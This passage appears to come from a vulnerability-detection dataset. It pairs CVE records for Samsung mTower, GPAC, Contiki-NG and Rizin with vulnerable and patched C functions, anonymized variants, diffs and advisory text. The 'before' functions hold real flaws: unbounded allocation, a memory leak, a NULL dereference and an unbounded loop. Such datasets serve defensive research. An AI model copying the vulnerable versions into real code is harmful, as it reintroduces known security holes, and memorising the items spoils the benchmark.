	if (hint == TEE_MALLOC_FILL_ZERO)
		memset(p, 0, len);
#if (CFG_TEE_CORE_USER_MEM_DEBUG == 1)
	if (hint == (typeof(hint)) TEE_USER_MEM_HINT_NO_FILL_ZERO)
		memset(p, 0xBB, len);
#endif
	return p;
}","void *tee_user_mem_alloc(size_t VAR_0, uint32_t VAR_1)
{
	uint8_t *VAR_2;
	void* VAR_3 = &VAR_4;
	void* VAR_5 = &VAR_6;

	switch (VAR_1) {
	case VAR_7:
	case VAR_8:
		break;
	default:
		EMSG(""Invalid alloc hint [%X]"", (unsigned int)VAR_1);
		return NULL;
	}
	/* COMMENT_0 */
	/* COMMENT_1 */
	if ((VAR_3 - VAR_5)/2 < VAR_0 + 8)
		return NULL;
	/* COMMENT_2 */
	VAR_2 = malloc(VAR_0);
	/* COMMENT_3 */
	/* COMMENT_4 */
	if ( VAR_5 + ((VAR_3 - VAR_5)/2) < VAR_2 + VAR_0) {
		free(VAR_2);
		return NULL;
	}
	if (VAR_2 == NULL)
		return NULL;

	if (VAR_1 == VAR_7)
		memset(VAR_2, 0, VAR_0);
#if (VAR_9 == 1)
	if (VAR_1 == (typeof(hint)) VAR_8)
		memset(VAR_2, 0xBB, VAR_0);
#endif
	return VAR_2;
}",Samsung/mTower/236357f0e756f0fd2120a1a78cf573765471e088/tee_user_mem.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -1,6 +1,8 @@
 void *tee_user_mem_alloc(size_t len, uint32_t hint)
 {
 	uint8_t *p;
+	void* limit = &__HeapLimit;
+	void* base = &__HeapBase;
 
 	switch (hint) {
 	case TEE_MALLOC_FILL_ZERO:
@@ -10,9 +12,18 @@
 		EMSG(""Invalid alloc hint [%X]"", (unsigned int)hint);
 		return NULL;
 	}
-
+	// printf(""malloc = base = %x\n"", base );
+	// printf(""malloc = (limit - base)/2 = %x\n"", (limit - base)/2 );
+	if ((limit - base)/2 < len + 8)
+		return NULL;
 	//  p = utee_malloc(len);
 	p = malloc(len);
+	// printf(""malloc 1 = base + ((limit - base)/2) = %x\n"", base + ((limit - base)/2) );
+	// printf(""malloc 2 = p + len = %x\n"", p + len );
+	if ( base + ((limit - base)/2) < p + len) {
+		free(p);
+		return NULL;
+	}
 	if (p == NULL)
 		return NULL;
 ","{'deleted_lines': [''], 'added_lines': ['\tvoid* limit = &__HeapLimit;', '\tvoid* base = &__HeapBase;', '\t// printf(""malloc = base = %x\\n"", base );', '\t// printf(""malloc = (limit - base)/2 = %x\\n"", (limit - base)/2 );', '\tif ((limit - base)/2 < len + 8)', '\t\treturn NULL;', '\t// printf(""malloc 1 = base + ((limit - base)/2) = %x\\n"", base + ((limit - base)/2) );', '\t// printf(""malloc 2 = p + len = %x\\n"", p + len );', '\tif ( base + ((limit - base)/2) < p + len) {', '\t\tfree(p);', '\t\treturn NULL;', '\t}']}",True,"TEE_Malloc in Samsung mTower through 0.3.0 allows a trusted application to achieve Excessive Memory Allocation via a large len value, as demonstrated by a Numaker-PFM-M2351 TEE kernel crash.",7.5,HIGH,2,valid,2022-10-25T13:35:25Z,4
CVE-2022-38155,['CWE-770'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,Samsung/mTower,"Fixed CVE-2022-38155, CVE-2022-40762

Signed-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",236357f0e756f0fd2120a1a78cf573765471e088,https://github.com/Samsung/mTower/commit/236357f0e756f0fd2120a1a78cf573765471e088,tee/lib/libutee/tee_user_mem.c,tee_user_mem_realloc,"void *tee_user_mem_realloc(void *buffer, size_t len)
{
return realloc(buffer, len);
}","void *tee_user_mem_realloc(void *VAR_0, size_t VAR_1)
{
return realloc(VAR_0, VAR_1);
}",Samsung/mTower/236357f0e756f0fd2120a1a78cf573765471e088/tee_user_mem.c/vul/before/0.json,"void *tee_user_mem_realloc(void *buffer, size_t len)
{
	uint8_t *p;
	void* limit = &__HeapLimit;
	void* base = &__HeapBase;

	if ((limit - base)/2 < len + 8)
		return NULL;
	p = realloc(buffer, len);
	if ( base + ((limit - base)/2) < p + len) {
		free(p);
		return NULL;
	}
//   return utee_realloc(buffer, len);
	return p;
}","void *tee_user_mem_realloc(void *VAR_0, size_t VAR_1)
{
	uint8_t *VAR_2;
	void* VAR_3 = &VAR_4;
	void* VAR_5 = &VAR_6;

	if ((VAR_3 - VAR_5)/2 < VAR_1 + 8)
		return NULL;
	VAR_2 = realloc(VAR_0, VAR_1);
	if ( VAR_5 + ((VAR_3 - VAR_5)/2) < VAR_2 + VAR_1) {
		free(VAR_2);
		return NULL;
	}
/* COMMENT_0 */
	return VAR_2;
}",Samsung/mTower/236357f0e756f0fd2120a1a78cf573765471e088/tee_user_mem.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,5 +1,16 @@
 void *tee_user_mem_realloc(void *buffer, size_t len)
 {
-//  return utee_realloc(buffer, len);
-  return realloc(buffer, len);
+	uint8_t *p;
+	void* limit = &__HeapLimit;
+	void* base = &__HeapBase;
+
+	if ((limit - base)/2 < len + 8)
+		return NULL;
+	p = realloc(buffer, len);
+	if ( base + ((limit - base)/2) < p + len) {
+		free(p);
+		return NULL;
+	}
+//   return utee_realloc(buffer, len);
+	return p;
 }","{'deleted_lines': ['//  return utee_realloc(buffer, len);', '  return realloc(buffer, len);'], 'added_lines': ['\tuint8_t *p;', '\tvoid* limit = &__HeapLimit;', '\tvoid* base = &__HeapBase;', '', '\tif ((limit - base)/2 < len + 8)', '\t\treturn NULL;', '\tp = realloc(buffer, len);', '\tif ( base + ((limit - base)/2) < p + len) {', '\t\tfree(p);', '\t\treturn NULL;', '\t}', '//   return utee_realloc(buffer, len);', '\treturn p;']}",True,"TEE_Malloc in Samsung mTower through 0.3.0 allows a trusted application to achieve Excessive Memory Allocation via a large len value, as demonstrated by a Numaker-PFM-M2351 TEE kernel crash.",7.5,HIGH,2,valid,2022-10-25T13:35:25Z,4
CVE-2022-45204,['CWE-401'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2307,f045be5809808d64ebf8ce5ab628fa55786bea4f,https://github.com/gpac/gpac/commit/f045be5809808d64ebf8ce5ab628fa55786bea4f,src/isomedia/box_code_3gpp.c,dimC_box_read,"GF_Err dimC_box_read(GF_Box *s, GF_BitStream *bs)
{
u32 i, msize;
GF_DIMSSceneConfigBox *p = (GF_DIMSSceneConfigBox *)s;
ISOM_DECREASE_SIZE(p, 3);
p->profile = gf_bs_read_u8(bs);
p->level = gf_bs_read_u8(bs);
p->pathComponents = gf_bs_read_int(bs, 4);
p->fullRequestHost = gf_bs_read_int(bs, 1);
p->streamType = gf_bs_read_int(bs, 1);
p->containsRedundant = gf_bs_read_int(bs, 2);
char *str = gf_malloc(sizeof(char)*(p->size+1));
if (!str) return GF_OUT_OF_MEM;
msize = (u32) p->size;
str[msize] = 0;
i=0;
str[0]=0;
while (i < msize) {
ISOM_DECREASE_SIZE(p, 1);
str[i] = gf_bs_read_u8(bs);
if (!str[i]) break;
i++;
}
if (i == msize) {
gf_free(str);
return GF_ISOM_INVALID_FILE;
}
p->textEncoding = gf_strdup(str);
i=0;
str[0]=0;
while (i < msize) {
ISOM_DECREASE_SIZE(p, 1);
str[i] = gf_bs_read_u8(bs);
if (!str[i]) break;
i++;
}
if (i == msize) {
gf_free(str);
return GF_ISOM_INVALID_FILE;
}
p->contentEncoding = gf_strdup(str);
gf_free(str);
if (!p->textEncoding || !p->contentEncoding)
return GF_OUT_OF_MEM;
return GF_OK;
}","GF_Err dimC_box_read(GF_Box *VAR_0, GF_BitStream *VAR_1)
{
u32 VAR_2, VAR_3;
GF_DIMSSceneConfigBox *VAR_4 = (GF_DIMSSceneConfigBox *)VAR_0;
ISOM_DECREASE_SIZE(VAR_4, 3);
VAR_4->profile = gf_bs_read_u8(VAR_1);
VAR_4->level = gf_bs_read_u8(VAR_1);
VAR_4->pathComponents = gf_bs_read_int(VAR_1, 4);
VAR_4->fullRequestHost = gf_bs_read_int(VAR_1, 1);
VAR_4->streamType = gf_bs_read_int(VAR_1, 1);
VAR_4->containsRedundant = gf_bs_read_int(VAR_1, 2);
char *VAR_5 = gf_malloc(sizeof(char)*(VAR_4->size+1));
if (!VAR_5) return VAR_6;
VAR_3 = (u32) VAR_4->size;
VAR_5[VAR_3] = 0;
VAR_2=0;
VAR_5[0]=0;
while (VAR_2 < VAR_3) {
ISOM_DECREASE_SIZE(VAR_4, 1);
VAR_5[VAR_2] = gf_bs_read_u8(VAR_1);
if (!VAR_5[VAR_2]) break;
VAR_2++;
}
if (VAR_2 == VAR_3) {
gf_free(VAR_5);
return VAR_7;
}
VAR_4->textEncoding = gf_strdup(VAR_5);
VAR_2=0;
VAR_5[0]=0;
while (VAR_2 < VAR_3) {
ISOM_DECREASE_SIZE(VAR_4, 1);
VAR_5[VAR_2] = gf_bs_read_u8(VAR_1);
if (!VAR_5[VAR_2]) break;
VAR_2++;
}
if (VAR_2 == VAR_3) {
gf_free(VAR_5);
return VAR_7;
}
VAR_4->contentEncoding = gf_strdup(VAR_5);
gf_free(VAR_5);
if (!VAR_4->textEncoding || !VAR_4->contentEncoding)
return VAR_6;
return VAR_8;
}",gpac/f045be5809808d64ebf8ce5ab628fa55786bea4f/box_code_3gpp.c/vul/before/0.json,"GF_Err dimC_box_read(GF_Box *s, GF_BitStream *bs)
{
	GF_Err e = GF_OK;
	u32 i, msize;
	GF_DIMSSceneConfigBox *p = (GF_DIMSSceneConfigBox *)s;

	ISOM_DECREASE_SIZE(p, 3);
	p->profile = gf_bs_read_u8(bs);
	p->level = gf_bs_read_u8(bs);
	p->pathComponents = gf_bs_read_int(bs, 4);
	p->fullRequestHost = gf_bs_read_int(bs, 1);
	p->streamType = gf_bs_read_int(bs, 1);
	p->containsRedundant = gf_bs_read_int(bs, 2);

	char *str = gf_malloc(sizeof(char)*(p->size+1));
	if (!str) return GF_OUT_OF_MEM;
	msize = (u32) p->size;
	str[msize] = 0;
	i=0;
	str[0]=0;
	while (i < msize) {
		ISOM_DECREASE_SIZE_GOTO_EXIT(p, 1);
		str[i] = gf_bs_read_u8(bs);
		if (!str[i]) break;
		i++;
	}
	if (i == msize) {
		gf_free(str);
		return GF_ISOM_INVALID_FILE;
	}

	p->textEncoding = gf_strdup(str);

	i=0;
	str[0]=0;
	while (i < msize) {
		ISOM_DECREASE_SIZE_GOTO_EXIT(p, 1);
		str[i] = gf_bs_read_u8(bs);
		if (!str[i]) break;
		i++;
	}
	if (i == msize) {
		gf_free(str);
		return GF_ISOM_INVALID_FILE;
	}

	p->contentEncoding = gf_strdup(str);
	gf_free(str);
	if (!p->textEncoding || !p->contentEncoding)
		return GF_OUT_OF_MEM;
	return GF_OK;

exit:
	gf_free(str);
	return e;
}","GF_Err dimC_box_read(GF_Box *VAR_0, GF_BitStream *VAR_1)
{
	GF_Err VAR_2 = VAR_3;
	u32 VAR_4, VAR_5;
	GF_DIMSSceneConfigBox *VAR_6 = (GF_DIMSSceneConfigBox *)VAR_0;

	ISOM_DECREASE_SIZE(VAR_6, 3);
	VAR_6->profile = gf_bs_read_u8(VAR_1);
	VAR_6->level = gf_bs_read_u8(VAR_1);
	VAR_6->pathComponents = gf_bs_read_int(VAR_1, 4);
	VAR_6->fullRequestHost = gf_bs_read_int(VAR_1, 1);
	VAR_6->streamType = gf_bs_read_int(VAR_1, 1);
	VAR_6->containsRedundant = gf_bs_read_int(VAR_1, 2);

	char *VAR_7 = gf_malloc(sizeof(char)*(VAR_6->size+1));
	if (!VAR_7) return VAR_8;
	VAR_5 = (u32) VAR_6->size;
	VAR_7[VAR_5] = 0;
	VAR_4=0;
	VAR_7[0]=0;
	while (VAR_4 < VAR_5) {
		ISOM_DECREASE_SIZE_GOTO_EXIT(VAR_6, 1);
		VAR_7[VAR_4] = gf_bs_read_u8(VAR_1);
		if (!VAR_7[VAR_4]) break;
		VAR_4++;
	}
	if (VAR_4 == VAR_5) {
		gf_free(VAR_7);
		return VAR_9;
	}

	VAR_6->textEncoding = gf_strdup(VAR_7);

	VAR_4=0;
	VAR_7[0]=0;
	while (VAR_4 < VAR_5) {
		ISOM_DECREASE_SIZE_GOTO_EXIT(VAR_6, 1);
		VAR_7[VAR_4] = gf_bs_read_u8(VAR_1);
		if (!VAR_7[VAR_4]) break;
		VAR_4++;
	}
	if (VAR_4 == VAR_5) {
		gf_free(VAR_7);
		return VAR_9;
	}

	VAR_6->contentEncoding = gf_strdup(VAR_7);
	gf_free(VAR_7);
	if (!VAR_6->textEncoding || !VAR_6->contentEncoding)
		return VAR_8;
	return VAR_3;

exit:
	gf_free(VAR_7);
	return VAR_2;
}",gpac/f045be5809808d64ebf8ce5ab628fa55786bea4f/box_code_3gpp.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,5 +1,6 @@
 GF_Err dimC_box_read(GF_Box *s, GF_BitStream *bs)
 {
+	GF_Err e = GF_OK;
 	u32 i, msize;
 	GF_DIMSSceneConfigBox *p = (GF_DIMSSceneConfigBox *)s;
 
@@ -18,7 +19,7 @@
 	i=0;
 	str[0]=0;
 	while (i < msize) {
-		ISOM_DECREASE_SIZE(p, 1);
+		ISOM_DECREASE_SIZE_GOTO_EXIT(p, 1);
 		str[i] = gf_bs_read_u8(bs);
 		if (!str[i]) break;
 		i++;
@@ -33,7 +34,7 @@
 	i=0;
 	str[0]=0;
 	while (i < msize) {
-		ISOM_DECREASE_SIZE(p, 1);
+		ISOM_DECREASE_SIZE_GOTO_EXIT(p, 1);
 		str[i] = gf_bs_read_u8(bs);
 		if (!str[i]) break;
 		i++;
@@ -48,4 +49,8 @@
 	if (!p->textEncoding || !p->contentEncoding)
 		return GF_OUT_OF_MEM;
 	return GF_OK;
+
+exit:
+	gf_free(str);
+	return e;
 }","{'deleted_lines': ['\t\tISOM_DECREASE_SIZE(p, 1);', '\t\tISOM_DECREASE_SIZE(p, 1);'], 'added_lines': ['\tGF_Err e = GF_OK;', '\t\tISOM_DECREASE_SIZE_GOTO_EXIT(p, 1);', '\t\tISOM_DECREASE_SIZE_GOTO_EXIT(p, 1);', '', 'exit:', '\tgf_free(str);', '\treturn e;']}",True,GPAC v2.1-DEV-rev428-gcb8ae46c8-master was discovered to contain a memory leak via the function dimC_box_read at isomedia/box_code_3gpp.c.,5.5,MEDIUM,1,valid,2022-11-07T16:09:02Z,4
CVE-2023-31129,['CWE-476'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,contiki-ng,fix rs_input missing NULL pointer check,c23cf7a16289afe716ae023c664ded16e88efd2d,https://github.com/contiki-ng/contiki-ng/commit/c23cf7a16289afe716ae023c664ded16e88efd2d,os/net/ipv6/uip-nd6.c,rs_input,"static void
rs_input(void)
{
LOG_INFO(""Received RS from "");
LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
LOG_INFO_("" to "");
LOG_INFO_6ADDR(&UIP_IP_BUF->destipaddr);
LOG_INFO_(""\n"");
UIP_STAT(++uip_stat.nd6.recv);
#if UIP_CONF_IPV6_CHECKS
if((UIP_IP_BUF->ttl != UIP_ND6_HOP_LIMIT) || (UIP_ICMP_BUF->icode != 0)) {
LOG_ERR(""RS received is bad\n"");
goto discard;
}
#endif 
nd6_opt_offset = UIP_ND6_RS_LEN;
nd6_opt_llao = NULL;
while(uip_l3_icmp_hdr_len + nd6_opt_offset < uip_len) {
#if UIP_CONF_IPV6_CHECKS
if(ND6_OPT_HDR_BUF(nd6_opt_offset)->len == 0) {
LOG_ERR(""RS received is bad\n"");
goto discard;
}
#endif 
switch (ND6_OPT_HDR_BUF(nd6_opt_offset)->type) {
case UIP_ND6_OPT_SLLAO:
nd6_opt_llao = (uint8_t *)ND6_OPT_HDR_BUF(nd6_opt_offset);
break;
default:
LOG_WARN(""ND option not supported in RS\n"");
break;
}
nd6_opt_offset += (ND6_OPT_HDR_BUF(nd6_opt_offset)->len << 3);
}
if(nd6_opt_llao != NULL) {
#if UIP_CONF_IPV6_CHECKS
if(uip_is_addr_unspecified(&UIP_IP_BUF->srcipaddr)) {
LOG_ERR(""RS received is bad\n"");
goto discard;
} else {
#endif 
uip_lladdr_t lladdr_aligned;
extract_lladdr_from_llao_aligned(&lladdr_aligned);
if((nbr = uip_ds6_nbr_lookup(&UIP_IP_BUF->srcipaddr)) == NULL) {
uip_ds6_nbr_add(&UIP_IP_BUF->srcipaddr, &lladdr_aligned,
0, NBR_STALE, NBR_TABLE_REASON_IPV6_ND, NULL);
} else {
const uip_lladdr_t *lladdr = uip_ds6_nbr_get_ll(nbr);
if(lladdr == NULL) {
goto discard;
}
if(memcmp(&nd6_opt_llao[UIP_ND6_OPT_DATA_OFFSET],
lladdr, UIP_LLADDR_LEN) != 0) {
uip_ds6_nbr_t nbr_data;
nbr_data = *nbr;
uip_ds6_nbr_rm(nbr);
nbr = uip_ds6_nbr_add(&UIP_IP_BUF->srcipaddr, &lladdr_aligned,
0, NBR_STALE, NBR_TABLE_REASON_IPV6_ND, NULL);
nbr->reachable = nbr_data.reachable;
nbr->sendns = nbr_data.sendns;
nbr->nscount = nbr_data.nscount;
}
nbr->isrouter = 0;
}
#if UIP_CONF_IPV6_CHECKS
}
#endif 
}
uip_ds6_send_ra_sollicited();
discard:
uipbuf_clear();
return;
}","static void
rs_input(void)
{
LOG_INFO(""Received RS from "");
LOG_INFO_6ADDR(&VAR_0->srcipaddr);
LOG_INFO_("" to "");
LOG_INFO_6ADDR(&VAR_0->destipaddr);
LOG_INFO_(""\n"");
UIP_STAT(++VAR_1.nd6.recv);
#if VAR_2
if((VAR_0->ttl != VAR_3) || (VAR_4->icode != 0)) {
LOG_ERR(""RS received is bad\n"");
goto discard;
}
#endif 
VAR_5 = VAR_6;
VAR_7 = NULL;
while(VAR_8 + VAR_5 < VAR_9) {
#if VAR_2
if(ND6_OPT_HDR_BUF(VAR_5)->len == 0) {
LOG_ERR(""RS received is bad\n"");
goto discard;
}
#endif 
switch (ND6_OPT_HDR_BUF(VAR_5)->type) {
case VAR_10:
VAR_7 = (uint8_t *)ND6_OPT_HDR_BUF(VAR_5);
break;
default:
LOG_WARN(""ND option not supported in RS\n"");
break;
}
VAR_5 += (ND6_OPT_HDR_BUF(VAR_5)->len << 3);
}
if(VAR_7 != NULL) {
#if VAR_2
if(uip_is_addr_unspecified(&VAR_0->srcipaddr)) {
LOG_ERR(""RS received is bad\n"");
goto discard;
} else {
#endif
uip_lladdr_t lladdr_aligned;
extract_lladdr_from_llao_aligned(&VAR_11);
if((VAR_12 = uip_ds6_nbr_lookup(&VAR_0->srcipaddr)) == NULL) {
uip_ds6_nbr_add(&VAR_0->srcipaddr, &VAR_11,
0, VAR_13, VAR_14, NULL);
} else {
const uip_lladdr_t *VAR_15 = uip_ds6_nbr_get_ll(VAR_12);
if(VAR_15 == NULL) {
goto discard;
}
if(memcmp(&VAR_7[VAR_16],
VAR_15, VAR_17) != 0) {
uip_ds6_nbr_t VAR_18;
VAR_18 = *VAR_12;
uip_ds6_nbr_rm(VAR_12);
VAR_12 = uip_ds6_nbr_add(&VAR_0->srcipaddr, &VAR_11,
0, VAR_13, VAR_14, NULL);
VAR_12->reachable = VAR_18.reachable;
VAR_12->sendns = VAR_18.sendns;
VAR_12->nscount = VAR_18.nscount;
}
VAR_12->isrouter = 0;
}
#if VAR_2
}
#endif 
}
uip_ds6_send_ra_sollicited();
discard:
uipbuf_clear();
return;
}",contiki-ng/c23cf7a16289afe716ae023c664ded16e88efd2d/uip-nd6.c/vul/before/0.json,"static void
rs_input(void)
{

  LOG_INFO(""Received RS from "");
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_("" to "");
  LOG_INFO_6ADDR(&UIP_IP_BUF->destipaddr);
  LOG_INFO_(""\n"");
  UIP_STAT(++uip_stat.nd6.recv);


#if UIP_CONF_IPV6_CHECKS
  /*
   * Check hop limit / icmp code
   * target address must not be multicast
   * if the NA is solicited, dest must not be multicast
   */
  if((UIP_IP_BUF->ttl != UIP_ND6_HOP_LIMIT) || (UIP_ICMP_BUF->icode != 0)) {
    LOG_ERR(""RS received is bad\n"");
    goto discard;
  }
#endif /*UIP_CONF_IPV6_CHECKS */

  /* Only valid option is Source Link-Layer Address option any thing
     else is discarded */
  nd6_opt_offset = UIP_ND6_RS_LEN;
  nd6_opt_llao = NULL;

  while(uip_l3_icmp_hdr_len + nd6_opt_offset < uip_len) {
#if UIP_CONF_IPV6_CHECKS
    if(ND6_OPT_HDR_BUF(nd6_opt_offset)->len == 0) {
      LOG_ERR(""RS received is bad\n"");
      goto discard;
    }
#endif /*UIP_CONF_IPV6_CHECKS */
    switch (ND6_OPT_HDR_BUF(nd6_opt_offset)->type) {
    case UIP_ND6_OPT_SLLAO:
      nd6_opt_llao = (uint8_t *)ND6_OPT_HDR_BUF(nd6_opt_offset);
      break;
    default:
      LOG_WARN(""ND option not supported in RS\n"");
      break;
    }
    nd6_opt_offset += (ND6_OPT_HDR_BUF(nd6_opt_offset)->len << 3);
  }
  /* Options processing: only SLLAO */
  if(nd6_opt_llao != NULL) {
#if UIP_CONF_IPV6_CHECKS
    if(uip_is_addr_unspecified(&UIP_IP_BUF->srcipaddr)) {
      LOG_ERR(""RS received is bad\n"");
      goto discard;
    } else {
#endif /*UIP_CONF_IPV6_CHECKS */
      uip_lladdr_t lladdr_aligned;
      extract_lladdr_from_llao_aligned(&lladdr_aligned);
      if((nbr = uip_ds6_nbr_lookup(&UIP_IP_BUF->srcipaddr)) == NULL) {
        /* we need to add the neighbor */
        uip_ds6_nbr_add(&UIP_IP_BUF->srcipaddr, &lladdr_aligned,
                        0, NBR_STALE, NBR_TABLE_REASON_IPV6_ND, NULL);
      } else {
        /* If LL address changed, set neighbor state to stale */
        const uip_lladdr_t *lladdr = uip_ds6_nbr_get_ll(nbr);
        if(lladdr == NULL) {
          goto discard;
        }
        if(memcmp(&nd6_opt_llao[UIP_ND6_OPT_DATA_OFFSET],
            lladdr, UIP_LLADDR_LEN) != 0) {
          uip_ds6_nbr_t nbr_data;
          nbr_data = *nbr;
          uip_ds6_nbr_rm(nbr);
          nbr = uip_ds6_nbr_add(&UIP_IP_BUF->srcipaddr, &lladdr_aligned,
                                0, NBR_STALE, NBR_TABLE_REASON_IPV6_ND, NULL);
          if(nbr == NULL) {
            goto discard;
          }
          nbr->reachable = nbr_data.reachable;
          nbr->sendns = nbr_data.sendns;
          nbr->nscount = nbr_data.nscount;
        }
        nbr->isrouter = 0;
      }
#if UIP_CONF_IPV6_CHECKS
    }
#endif /*UIP_CONF_IPV6_CHECKS */
  }

  /* Schedule a sollicited RA */
  uip_ds6_send_ra_sollicited();

discard:
  uipbuf_clear();
  return;
}","static void
rs_input(void)
{

  LOG_INFO(""Received RS from "");
  LOG_INFO_6ADDR(&VAR_0->srcipaddr);
  LOG_INFO_("" to "");
  LOG_INFO_6ADDR(&VAR_0->destipaddr);
  LOG_INFO_(""\n"");
  UIP_STAT(++VAR_1.nd6.recv);


#if VAR_2
  /* COMMENT_0 */
                                
                                         
                                                       
     
  if((VAR_0->ttl != VAR_3) || (VAR_4->icode != 0)) {
    LOG_ERR(""RS received is bad\n"");
    goto discard;
  }
#endif /* COMMENT_5 */

  /* COMMENT_6 */
                         
  VAR_5 = VAR_6;
  VAR_7 = NULL;

  while(VAR_8 + VAR_5 < VAR_9) {
#if VAR_2
    if(ND6_OPT_HDR_BUF(VAR_5)->len == 0) {
      LOG_ERR(""RS received is bad\n"");
      goto discard;
    }
#endif /* COMMENT_5 */
    switch (ND6_OPT_HDR_BUF(VAR_5)->type) {
    case VAR_10:
      VAR_7 = (uint8_t *)ND6_OPT_HDR_BUF(VAR_5);
      break;
    default:
      LOG_WARN(""ND option not supported in RS\n"");
      break;
    }
    VAR_5 += (ND6_OPT_HDR_BUF(VAR_5)->len << 3);
  }
  /* COMMENT_8 */
  if(VAR_7 != NULL) {
#if VAR_2
    if(uip_is_addr_unspecified(&VAR_0->srcipaddr)) {
      LOG_ERR(""RS received is bad\n"");
      goto discard;
    } else {
#endif/* COMMENT_9 */
      uip_lladdr_t lladdr_aligned;
      extract_lladdr_from_llao_aligned(&VAR_11);
      if((VAR_12 = uip_ds6_nbr_lookup(&VAR_0->srcipaddr)) == NULL) {
        /* COMMENT_10 */
        uip_ds6_nbr_add(&VAR_0->srcipaddr, &VAR_11,
                        0, VAR_13, VAR_14, NULL);
      } else {
        /* COMMENT_11 */
        const uip_lladdr_t *VAR_15 = uip_ds6_nbr_get_ll(VAR_12);
        if(VAR_15 == NULL) {
          goto discard;
        }
        if(memcmp(&VAR_7[VAR_16],
            VAR_15, VAR_17) != 0) {
          uip_ds6_nbr_t VAR_18;
          VAR_18 = *VAR_12;
          uip_ds6_nbr_rm(VAR_12);
          VAR_12 = uip_ds6_nbr_add(&VAR_0->srcipaddr, &VAR_11,
                                0, VAR_13, VAR_14, NULL);
          if(VAR_12 == NULL) {
            goto discard;
          }
          VAR_12->reachable = VAR_18.reachable;
          VAR_12->sendns = VAR_18.sendns;
          VAR_12->nscount = VAR_18.nscount;
        }
        VAR_12->isrouter = 0;
      }
#if VAR_2
    }
#endif /* COMMENT_5 */
  }

  /* COMMENT_12 */
  uip_ds6_send_ra_sollicited();

discard:
  uipbuf_clear();
  return;
}",contiki-ng/c23cf7a16289afe716ae023c664ded16e88efd2d/uip-nd6.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -71,6 +71,9 @@
           uip_ds6_nbr_rm(nbr);
           nbr = uip_ds6_nbr_add(&UIP_IP_BUF->srcipaddr, &lladdr_aligned,
                                 0, NBR_STALE, NBR_TABLE_REASON_IPV6_ND, NULL);
+          if(nbr == NULL) {
+            goto discard;
+          }
           nbr->reachable = nbr_data.reachable;
           nbr->sendns = nbr_data.sendns;
           nbr->nscount = nbr_data.nscount;","{'deleted_lines': [], 'added_lines': ['          if(nbr == NULL) {', '            goto discard;', '          }']}",True,"The Contiki-NG operating system versions 4.8 and prior can be triggered to dereference a NULL pointer in the message handling code for IPv6 router solicitiations. Contiki-NG contains an implementation of IPv6 Neighbor Discovery (ND) in the module `os/net/ipv6/uip-nd6.c`. The ND protocol includes a message type called Router Solicitation (RS), which is used to locate routers and update their address information via the SLLAO (Source Link-Layer Address Option). If the indicated source address changes, a given neighbor entry is set to the STALE state.

The message handler does not check for RS messages with an SLLAO that indicates a link-layer address change that a neighbor entry can actually be created for the indicated address. The resulting pointer is used without a check, leading to the dereference of a NULL pointer of type `uip_ds6_nbr_t`.

The problem has been patched in the `develop` branch of Contiki-NG, and will be included in the upcoming 4.9 release. As a workaround, users can apply Contiki-NG pull request #2271 to patch the problem directly.",7.5,HIGH,2,valid,2022-11-09T17:11:28Z,4
CVE-2023-30226,['CWE-834'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,rizinorg/rizin,"ELF: added vn_next break condition (#3214)

if the dynamic section's verneednum mismatches the true number of entries then the for loop in get_gnu_verneed will continue to iterate on the last entry since vn_next will be 0 on the last entry. If verneednum is set to all 0xff's it will take a very long time to finish this loop naturally drastically hindering binary load time. The solution is simple, to check for when vn_next == 0 and break out of the loop since all entries have been iterated over regardless of what verneednum indicates.",a6d89de0d44e776f9bccc3a168fdc79f604e14ed,https://github.com/rizinorg/rizin/commit/a6d89de0d44e776f9bccc3a168fdc79f604e14ed,librz/bin/format/elf/elf_info.c,get_gnu_verneed,"static Sdb *get_gnu_verneed(ELFOBJ *bin) {
ut64 verneed_addr;
ut64 verneed_num;
if (!Elf_(rz_bin_elf_get_dt_info)(bin, DT_VERNEED, &verneed_addr) || !Elf_(rz_bin_elf_get_dt_info)(bin, DT_VERNEEDNUM, &verneed_num)) {
return NULL;
}
ut64 verneed_offset = Elf_(rz_bin_elf_v2p(bin, verneed_addr));
if (verneed_offset == UT64_MAX) {
RZ_LOG_WARN(""Failed to convert verneed virtual address to physical address.\n"");
return NULL;
}
Sdb *sdb = sdb_new0();
if (!sdb) {
return NULL;
}
if (!sdb_num_set(sdb, ""num_entries"", verneed_num, 0) ||
!sdb_num_set(sdb, ""addr"", verneed_addr, 0) ||
!sdb_num_set(sdb, ""offset"", verneed_offset, 0)) {
sdb_free(sdb);
return NULL;
}
for (size_t i = 0; i < verneed_num; i++) {
Elf_(Verneed) verneed_entry;
if (!get_verneed_entry(bin, verneed_offset, &verneed_entry)) {
sdb_free(sdb);
return NULL;
}
Sdb *sdb_version = get_verneed_entry_sdb(bin, verneed_entry, verneed_offset);
if (!sdb_version) {
sdb_free(sdb);
return NULL;
}
char key[32];
if (!sdb_ns_set(sdb, rz_strf(key, ""version%zu"", i), sdb_version)) {
sdb_free(sdb_version);
sdb_free(sdb);
return NULL;
}
sdb_free(sdb_version);
verneed_offset += verneed_entry.vn_next;
}
return sdb;
}","static Sdb *get_gnu_verneed(ELFOBJ *VAR_0) {
ut64 VAR_1;
ut64 VAR_2;
if (!Elf_(VAR_3)(VAR_0, VAR_4, &VAR_1) || !Elf_(VAR_3)(VAR_0, VAR_5, &VAR_2)) {
return NULL;
}
ut64 VAR_6 = Elf_(rz_bin_elf_v2p(VAR_0, VAR_1));
if (VAR_6 == VAR_7) {
RZ_LOG_WARN(""Failed to convert verneed virtual address to physical address.\n"");
return NULL;
}
Sdb *VAR_8 = sdb_new0();
if (!VAR_8) {
return NULL;
}
if (!sdb_num_set(VAR_8, ""num_entries"", VAR_2, 0) ||
!sdb_num_set(VAR_8, ""addr"", VAR_1, 0) ||
!sdb_num_set(VAR_8, ""offset"", VAR_6, 0)) {
sdb_free(VAR_8);
return NULL;
}
